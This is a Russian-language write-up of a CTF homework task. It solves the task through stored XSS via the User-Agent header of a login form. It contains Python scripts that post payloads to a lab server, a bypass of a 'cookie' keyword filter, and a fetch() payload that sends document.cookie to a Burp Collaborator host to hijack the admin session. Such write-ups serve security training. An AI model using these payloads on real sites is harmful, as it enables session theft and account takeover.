# Forbidden_Code_HW

При входе на сайт видим форму для входа/регистрации

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312215659.png?raw=true)

При изучении страницы HTML находим подсказку о POST-запросе

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312220201.png?raw=true)

В личном кабинете можно найти логи неудачных попыток входа. После неудачной попытки входа получаем такую картину

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312220022.png?raw=true)

Регистрируем пользователя с именем `<script>alert(1)</script>` для проверки XSS payload. Получаем:

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312220615.png?raw=true)

>XSS, или межсайтовый скриптинг, — это тип атаки на веб-приложения, при котором злоумышленник может внедрять в содержимое веб-страницы вредоносный скрипт, который будет выполняться на стороне клиента. Это может привести к краже данных, сессий или даже полному контролю над учетной записью жертвы. Рассмотрим возможные пути кражи аккаунта через XSS и методологию предотвращения таких атак.

## Подготовка атаки
Изменить логин admin на payload нельзя. На поле id, username, IP, Date мы повлиять не можем, они генерируются на сервере, а вот на User-Agent можем. Напишем скрипт на python для этого:

```python
import requests

payload = "<script>alert(1);</script>" # это пейлоад

user = "asdf" #Тут наш username
headers = {'User-Agent': payload} # Вставляем его в хедер
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data) # Совершаем попытку логина с неверным паролем
 
print(response.status_code)# Выводим информацию
#print(response.text) 
```
Проверка скрипта прошла успешно:

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312231514.png?raw=true)

## Проработка атаки с помощью BurpSuite Pro (конечно же купленного)

После поиска в гугл по запросу "XSS steal cookie payloads" и изучения результатов понимаем что нам нужно захватить ```document.cookie``` **значение**.

Пробуем простой alert();

````python 
import requests


payload = '<script>alert(document.cookie);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````
И встречаем проблему
![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313002008.png?raw=true)

На сайте стоит фильтр на слово ```cookie```

##Обход фильтрации

Не забываем, что у нас есть неограниченный доступ к **javascript** на клиентской части.
в функции alert() нам нужно вывести document.cookie.
Собираем слово cookie из элементов массива
````javascript
const vv = ["coo", "kie"].join(""); # передаем его раздельно и с помощью join собираем в одно слово
alert(document[vv]); # не забываем что document это обьект, и к его значениям можно обращаться не только через точку, но и через [значение]
````
Пробуем этот payload.
````python 
import requests


payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````
Получаем результат
![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313002825.png?raw=true)

Вспоминаем зачем нам потребовался коллаборатор в бурпе.
Данное значение, которое только вывели в alert, мы будем ловить на его **сервер**.

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313003642.png?raw=true)

1) Переходим в вкладку
2) Копируем **url**
3) Переходим по ней в google
4) Нажимаем **Poll now**, чтобы получить с сервера данные.

Эта функция заменит нам ngrok или свой белый IP и сервер, очень удобно.
Копируем и вставляем в скрипт.


````python 
import requests


payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{СЮДА}}/?${vv}=` + document[vv]; fetch(payload);</script>'

user = "admin" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````
Отправляем, ждем, пуллим.

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313004232.png?raw=true)

Подставим значение PHPSESSID в наш браузер. 
![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313004351.png?raw=true)

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313004408.png?raw=true)

Получаем флаг: ***CODEBY{m1ss_th3_cl13nt_att4cks?}***
